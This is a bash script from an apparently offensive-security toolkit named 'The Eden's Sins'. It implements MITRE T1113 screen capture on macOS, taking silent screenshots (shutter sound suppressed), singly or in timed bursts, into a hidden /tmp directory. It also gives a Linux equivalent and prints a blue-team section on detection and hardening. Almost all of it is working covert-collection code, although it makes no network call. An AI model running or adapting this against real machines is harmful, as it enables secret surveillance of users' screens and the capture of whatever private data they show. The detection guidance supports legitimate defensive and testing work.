#!/usr/bin/env bash
# ============================================================
# Screenshot Capture — The Eden's Sins
# MITRE ATT&CK: T1113 Screen Capture
#
# Silent screenshot capture for PoC documentation.
# macOS may require Screen Recording TCC permission on Sonoma+.
#
# Usage:
#   bash screenshot.sh                    # Single screenshot
#   bash screenshot.sh --burst 5 --interval 3  # 5 shots, 3s apart
#   bash screenshot.sh --detect           # Blue team guidance
# ============================================================
set -euo pipefail

OUT_DIR="${OUT_DIR:-/tmp/.eden_screens}"
BURST=1
INTERVAL=3

while [[ $# -gt 0 ]]; do
    case "$1" in
        --burst) BURST="$2"; shift 2 ;;
        --interval) INTERVAL="$2"; shift 2 ;;
        --output) OUT_DIR="$2"; shift 2 ;;
        --detect)
            echo ""
            echo "  BLUE TEAM — Screen Capture Detection"
            echo "  ═════════════════════════════════════"
            echo ""
            echo "  Detection:"
            echo "    • TCC: Screen Recording permission required on Sonoma+"
            echo "    • Monitor screencapture command execution"
            echo "    • ESF: ES_EVENT_TYPE_NOTIFY_SCREENCAPTURE (macOS 14+)"
            echo "    • Alert on CGWindowListCreateImage API calls"
            echo "    • Track image file creation in /tmp"
            echo ""
            echo "  Hardening:"
            echo "    • Restrict Screen Recording TCC permission"
            echo "    • MDM: manage TCC via PPPC profiles"
            echo "    • Disable screencapture CLI via Santa/allowlisting"
            echo "    • Monitor /tmp for image file creation"
            echo ""
            exit 0
            ;;
        -h|--help)
            echo "Usage: $0 [--burst N] [--interval S] [--output DIR]"
            exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

if [[ "$(uname)" != "Darwin" ]]; then
    echo "[!] Not macOS — screencapture requires macOS"
    echo "[*] Equivalent on Linux: import -window root screenshot.png"
    exit 0
fi

mkdir -p "$OUT_DIR"

echo "╔══════════════════════════════════════════════╗"
echo "║  THE EDEN'S SINS — Screen Capture              ║"
echo "║  MITRE: T1113 Screen Capture                    ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "  Output: $OUT_DIR"
echo "  Burst: $BURST shots, ${INTERVAL}s interval"
echo ""

for i in $(seq 1 "$BURST"); do
    ts=$(date +%Y%m%d_%H%M%S)
    filename="${OUT_DIR}/screen_${ts}_${i}.png"

    # -x = no sound, -C = capture cursor
    screencapture -x -C "$filename" 2>/dev/null

    if [[ -f "$filename" ]]; then
        size=$(stat -f%z "$filename" 2>/dev/null || echo "?")
        echo "  📸 [$i/$BURST] ${filename} (${size} bytes)"
    else
        echo "  ❌ [$i/$BURST] Capture failed (TCC denied?)"
    fi

    if [[ $i -lt $BURST ]]; then
        sleep "$INTERVAL"
    fi
done

echo ""
echo "  Done. Files in: $OUT_DIR"
echo "  ⚠️  Remember to cleanup: rm -rf $OUT_DIR"
